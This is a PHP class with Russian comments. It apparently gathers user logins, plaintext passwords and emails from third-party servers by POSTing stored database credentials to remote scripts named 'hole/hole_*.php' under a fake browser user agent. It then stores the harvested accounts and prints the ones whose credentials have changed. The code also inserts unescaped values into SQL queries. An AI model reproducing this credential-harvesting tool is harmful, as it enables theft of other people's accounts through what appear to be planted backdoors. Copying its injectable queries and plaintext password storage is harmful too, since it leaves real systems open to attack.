<?php
/**
 * Description of Customers
 *
 * @author serjoga
 */
class OuterData {
    
    var $customers = array();
    
    var $changelist = array();
    
    function __construct() {
        $this->customers = $this->_getDBs();
    }
//    записываем пользователей во временную таблицу предварительно очистив ее
    public function _setTMP(){
        
        mysql_query("TRUNCATE `tmp`");
        
        foreach ($this->customers as $key => $value) {
            foreach ($value as $user) {
                $query = "INSERT INTO `tmp` (`dbid`, `login`, `password`, `email`) VALUES ({$key}, '{$user['login']}','{$user['password']}', '{$user['email']}')";
                mysql_query($query);
            }
        }
        
        $this->_setCustomers();
        
        return mysql_insert_id();
    }
    
    private function _matching() {
        
        $tmp = array();
        
        $query = "SELECT t.`dbid`, t.`login`, t.`password`, t.`email`, c.`id` FROM `tmp` AS t LEFT JOIN `customer` AS c ON t.`email` = c.`email`  WHERE t.`login` <> c.`login` OR t.`password` <> c.`password`";
        
        $result = mysql_query($query);
        
        while ($row = mysql_fetch_assoc($result)){
            array_push($tmp, $row);
        }
        
        $this->changelist = $tmp;
    }
    
//    записываем пользователей в таблицу но только тех которые появились на отслеживаемых ресурсах после предыдущего просмотра
    
    private function _setCustomers() {
        
        $query = "SELECT t.`login`, t.`password`, t.`email` FROM `tmp` AS t LEFT JOIN `customer` AS c ON t.`email` = c.`email` WHERE c.`email` is NULL";
        
        $result = mysql_query($query);
        
        while ($row = mysql_fetch_assoc($result)){
            mysql_query("INSERT INTO `customer` (`login`, `password`, `email`) VALUES ('{$row['login']}', '{$row['password']}', '{$row['email']}')");
        }
        
        $this->_matching();
        
        var_dump($this->changelist);
        
        return mysql_affected_rows();
        
    }
//    читаем список баз на базовом хосте и выбираем пользователей - клиентов из регистрированих баз
    private function _getDBs() {
        
        $tmp = array();
        
        $query = "SELECT `id`, `db_name`, `login`, `password`, `addr`, `charset`, `inet_address` FROM `db_data` WHERE `status`=1";
        
        $result = mysql_query($query);
        
        if(!$result){
            $tmp = NULL;
        }else{
            while ($row = mysql_fetch_assoc($result)){

               $row['users'] = 1;
               
               $customers_str = $this->_getHole($row);

               $tmp[$row['id']] = json_decode($customers_str,TRUE);
            }
        
        }
        
        return $tmp;
    }
//    функция доступа к сторонним серверам
    private function _getHole($rows){
        
        $data = '';
        
        $path = $rows['inet_address'];
        
        unset($rows['inet_address']);

        foreach ($rows as $key => $value){
            $data .= "&$key=$value";
        }
        
       //задаем контекст
        $context = stream_context_create(
        array(
                'http'=>array(
                                'header' => "User-Agent: Brauzer 2/0\r\nConnection: Close\r\n\r\n",
                                'method' => 'POST',
                                'content' => $data                
                             )
            )
        
        );

        $contents = file_get_contents("http://$path/hole/hole_{$path}.php", false ,$context);

        return $contents;
    }
}
